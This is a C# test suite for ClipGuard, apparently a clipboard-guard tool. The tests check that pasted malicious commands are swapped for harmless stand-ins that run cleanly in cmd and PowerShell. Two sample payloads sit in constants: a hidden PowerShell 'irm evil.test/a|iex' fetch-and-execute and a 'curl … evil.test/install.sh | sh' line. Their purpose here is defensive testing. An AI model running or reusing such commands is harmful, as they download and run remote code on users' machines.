using System.Diagnostics;
using ClipGuard.Services;

namespace ClipGuard.Tests;

/// <summary>
/// The stand-ins are only safe if a *shell* agrees, so these execute them
/// instead of reasoning about them.
///
/// This suite exists because reasoning was wrong once: a template containing
/// "$m" looked fine and passed every static check, but pasting it into a
/// PowerShell prompt let the outer shell expand the variable before the child
/// process saw it, turning the command into a visible CommandNotFoundException —
/// exactly the "your paste failed" tell the disguise is meant to avoid.
/// </summary>
public class DefusedTemplateTests
{
    private const string PowerShellPayload = "powershell -w hidden -c \"irm evil.test/a|iex\"";
    private const string UnixPayload = "curl -sL https://evil.test/install.sh | sh";

    public static TheoryData<string> AllTemplates() => new()
    {
        RiskAnalyzer.DefusedReplacementFor(PowerShellPayload),
        RiskAnalyzer.DefusedReplacementFor(UnixPayload)
    };

    [Fact]
    public void Windows_shaped_payloads_get_a_powershell_stand_in() =>
        Assert.StartsWith("powershell", RiskAnalyzer.DefusedReplacementFor(PowerShellPayload));

    [Fact]
    public void Unix_shaped_payloads_get_a_shell_stand_in() =>
        Assert.StartsWith("echo", RiskAnalyzer.DefusedReplacementFor(UnixPayload));

    [Theory]
    [MemberData(nameof(AllTemplates))]
    public void Stand_ins_contain_no_shell_expansion_characters(string template)
    {
        // '$' and '`' are expanded by the outer shell on paste into PowerShell.
        Assert.DoesNotContain('$', template);
        Assert.DoesNotContain('`', template);
    }

    [Theory]
    [MemberData(nameof(AllTemplates))]
    public void Stand_ins_are_not_themselves_flagged(string template)
    {
        // Otherwise defusing would trigger on its own output, forever.
        Assert.Equal(RiskKind.None, RiskAnalyzer.Classify(template));
        Assert.True(RiskAnalyzer.IsDefusedReplacement(template));
    }

    [Theory]
    [MemberData(nameof(AllTemplates))]
    public void Stand_ins_run_cleanly_in_cmd(string template)
    {
        // cmd parses a pasted line exactly as it parses /c.
        var (exitCode, stderr) = Run("cmd.exe", "/c " + template, stdin: null);

        Assert.Equal(0, exitCode);
        Assert.Empty(stderr.Trim());
    }

    [Theory]
    [MemberData(nameof(AllTemplates))]
    public void Stand_ins_run_cleanly_when_pasted_into_powershell(string template)
    {
        // Fed through stdin, because that is what pasting at a prompt does.
        // Passing the text as a -Command *argument* would route it through
        // CreateProcess quoting instead, which is a different parser and would
        // let the bug this suite exists for slip through.
        var (exitCode, stderr) = Run("powershell.exe", "-NoProfile -Command -", stdin: template);

        Assert.Equal(0, exitCode);
        Assert.Empty(stderr.Trim());
    }

    [Theory]
    [MemberData(nameof(AllTemplates))]
    public void Stand_ins_never_reach_the_network_or_disk(string template)
    {
        // A stand-in that fetched or wrote anything would defeat the point.
        Assert.DoesNotContain("http", template, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(">", template);
        Assert.DoesNotContain("|", template);
    }

    private static (int ExitCode, string StdErr) Run(string fileName, string arguments, string? stdin)
    {
        using var process = Process.Start(new ProcessStartInfo(fileName, arguments)
        {
            RedirectStandardInput = stdin is not null,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        })!;

        if (stdin is not null)
        {
            process.StandardInput.WriteLine(stdin);
            process.StandardInput.Close();
        }

        var stderr = process.StandardError.ReadToEnd();
        process.StandardOutput.ReadToEnd();
        process.WaitForExit(15_000);

        return (process.ExitCode, stderr);
    }
}
